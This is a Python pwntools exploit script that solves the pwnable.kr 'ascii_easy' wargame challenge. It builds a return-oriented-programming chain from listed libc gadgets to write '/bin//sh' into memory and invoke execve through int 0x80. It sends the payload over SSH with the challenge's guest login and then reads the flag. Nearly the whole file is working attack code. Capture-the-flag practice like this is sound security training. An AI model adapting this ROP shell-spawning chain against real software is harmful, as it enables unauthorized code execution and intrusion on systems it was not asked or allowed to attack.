from pwn import *
import argh

'''
found these gadgets using ropper
0x55667177: int 0x80;
0x556a6770: xor eax, eax; ret;
0x55644263: inc eax; ret;
0x556f6c4e: pop ebx; ret;
0x556d2a51: pop ecx; add al, 0xa; ret;
0x555f3555: pop edx; xor eax, eax; pop edi; ret;
0x55635738: mov dword ptr [edx], ecx; pop ebx; ret;
0x555e3774: mov dword ptr [edx], eax; mov eax, edx; ret;
'''


host = 'pwnable.kr'
user = 'ascii_easy'
port = 2222
password = 'guest'


script = '''
layout regs
break *0x8048532
continue
'''


@argh.arg('--local', '-l', help='Run Locally')
@argh.arg('--runpwn', '-r', help='Run Remotly')
def main(local=False, runpwn=False):
    p = None
    bin_path = './ascii_easy'
    libc_path = './libc-2.15.so'

    e = ELF(bin_path)
    libc = ELF(libc_path)
    libc.address = 0x5555e000

    INT80 = p32(0x55667177)
    XOR_EAX_EAX = p32(0x556a6770)
    INC_EAX = p32(0x55644263)
    POP_EBX = p32(0x556f6c4e)
    POP_ECX = p32(0x556d2a51)
    POP_EDX = p32(0x555f3555)
    MOV_ECX = p32(0x55635738)
    MOV_EAX = p32(0x555e3774)
    MEM = 0x55563250  # just chose a random area memory. since its rwx, anything is possible

    r = ROP(e)

    r.raw(POP_ECX)
    r.raw('/bin')
    r.raw(POP_EDX)
    r.raw(p32(MEM))
    r.raw('AAAA')
    r.raw(MOV_ECX)
    r.raw('AAAA')

    r.raw(POP_ECX)
    r.raw('//sh')
    r.raw(POP_EDX)
    r.raw(p32(MEM + 4))
    r.raw('AAAA')
    r.raw(MOV_ECX)
    r.raw('AAAA')

    r.raw(POP_EDX)
    r.raw(p32(MEM + 8))
    r.raw('AAAA')
    r.raw(XOR_EAX_EAX)
    r.raw(MOV_EAX)

    r.raw(POP_ECX)
    r.raw(p32(MEM + 8))
    r.raw(POP_EDX)
    r.raw(p32(MEM + 8))
    r.raw('AAAA')

    r.raw(POP_EBX)
    r.raw(MEM)

    r.raw(XOR_EAX_EAX)

    r.raw(INC_EAX)
    r.raw(INC_EAX)
    r.raw(INC_EAX)
    r.raw(INC_EAX)
    r.raw(INC_EAX)
    r.raw(INC_EAX)
    r.raw(INC_EAX)
    r.raw(INC_EAX)
    r.raw(INC_EAX)
    r.raw(INC_EAX)
    r.raw(INC_EAX)

    r.raw(INT80)

    s = fit({cyclic_find('iaaa'):r.chain()})

    argv = [bin_path, s]

    if local:
        p = gdb.debug(argv, script)
    elif runpwn:
        s = ssh(user, host, port, password)
        p = s.process(argv)

    if p.can_recv():
        p.recv()
    p.sendline('cat flag')
    print(p.recvline())


if __name__ == '__main__':
    argh.dispatch_command(main)

